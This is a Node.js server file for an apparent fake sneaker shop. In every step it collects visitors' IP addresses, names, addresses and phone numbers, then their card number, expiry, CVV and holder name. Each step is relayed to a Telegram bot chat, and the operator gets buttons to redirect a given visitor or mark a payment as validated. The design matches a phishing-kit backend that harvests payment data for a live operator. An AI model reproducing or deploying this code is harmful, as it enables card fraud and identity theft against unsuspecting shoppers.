// server.js
// ✅ Compatible Render, Node.js 18+, et Telegram Webhook

import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import bodyParser from "body-parser";
import cors from "cors";
import fetch from "node-fetch";
import { v4 as uuidv4 } from "uuid";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// 📦 Variables d'environnement (configurées sur Render)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const BASE_URL = process.env.BASE_URL || "https://basketnew.onrender.com";

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("❌ BOT_TOKEN ou CHAT_ID non défini dans Render");
}

// 🧠 Sessions temporaires
const sessions = {};

// 📩 Envoi d'une notification Telegram
async function sendTelegramNotif(data) {
  const msg = `
🆕 <b>Nouvelle interaction utilisateur</b>
🆔 <b>Session :</b> ${data.sessionId}
📄 <b>Page :</b> ${data.page}
👤 <b>Nom :</b> ${data.delivery?.nom || "—"} ${data.delivery?.prenom || ""}
👟 <b>Paire :</b> ${data.pair || "—"}
💳 <b>Carte :</b> ${data.card?.panMasked || "—"}
ℹ️ <b>Statut :</b> ${data.status}
  `;

  const keyboard = {
    inline_keyboard: [
      [{ text: "🏠 Accueil", callback_data: `redirect|${data.sessionId}|/` }],
      [{ text: "👟 Choix Paire", callback_data: `redirect|${data.sessionId}|/product.html` }],
      [{ text: "📦 Livraison", callback_data: `redirect|${data.sessionId}|/delivery.html` }],
      [{ text: "💳 Paiement", callback_data: `redirect|${data.sessionId}|/payment.html` }],
      [{ text: "✅ Valider paiement", callback_data: `validate|${data.sessionId}` }],
    ],
  };

  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: "HTML",
        reply_markup: keyboard,
      }),
    });

    const json = await res.json();
    if (!json.ok) console.error("Erreur Telegram :", json);
  } catch (err) {
    console.error("Erreur d'envoi Telegram :", err);
  }
}

// 🧭 Pages visitées / actions utilisateur
app.post("/api/visit", (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const sid = req.body.sessionId || uuidv4();

  sessions[sid] = sessions[sid] || { data: {}, approved: false };
  sessions[sid].data = {
    sessionId: sid,
    ip,
    page: "Accueil",
    status: "Nouvelle visite",
  };

  sendTelegramNotif(sessions[sid].data);
  res.json({ sessionId: sid });
});

app.post("/api/pair", (req, res) => {
  const { sessionId, pair } = req.body;
  if (!sessions[sessionId]) return res.status(400).send("Session invalide");

  sessions[sessionId].data.pair = pair;
  sessions[sessionId].data.page = "Choix Paire";
  sessions[sessionId].data.status = "Paire choisie";

  sendTelegramNotif(sessions[sessionId].data);
  res.json({ ok: true });
});

app.post("/api/delivery", (req, res) => {
  const { sessionId, nom, prenom, adresse, telephone } = req.body;
  if (!sessions[sessionId]) return res.status(400).send("Session invalide");

  sessions[sessionId].data.delivery = { nom, prenom, adresse, telephone };
  sessions[sessionId].data.page = "Livraison";
  sessions[sessionId].data.status = "Infos livraison";

  sendTelegramNotif(sessions[sessionId].data);
  res.json({ ok: true });
});

app.post("/api/payment", (req, res) => {
  const { sessionId, cardNumber, expiry, ccv, holder } = req.body;
  if (!sessions[sessionId]) return res.status(400).send("Session invalide");

  sessions[sessionId].data.card = {
    panMasked: "**** **** **** " + cardNumber.slice(-4),
    expiry,
    holder,
  };
  sessions[sessionId].data.page = "Paiement";
  sessions[sessionId].data.status = "Paiement en attente";

  sendTelegramNotif(sessions[sessionId].data);
  res.json({ ok: true });
});

// 📡 Webhook Telegram (clic sur bouton)
app.post("/telegramWebhook", async (req, res) => {
  const body = req.body;

  if (body.callback_query) {
    const cb = body.callback_query;
    const data = cb.data || "";
    const [action, sid, url] = data.split("|");

    if (action === "redirect" && sid && url) {
      console.log(`🔁 Redirection demandée pour ${sid} vers ${url}`);
      // ✅ ici tu pourrais envoyer une commande via WebSocket au client pour le rediriger
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: cb.id,
          text: `L’utilisateur ${sid} va être redirigé.`,
        }),
      });
    }

    if (action === "validate" && sid) {
      sessions[sid].approved = true;
      sessions[sid].data.status = "Paiement validé ✅";
      sendTelegramNotif(sessions[sid].data);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: cb.id,
          text: `Paiement validé pour ${sid}`,
        }),
      });
    }
  }

  res.sendStatus(200);
});

// 🏠 Accueil
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// 🚀 Lancement du serveur
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Serveur prêt sur le port ${PORT}`);
});
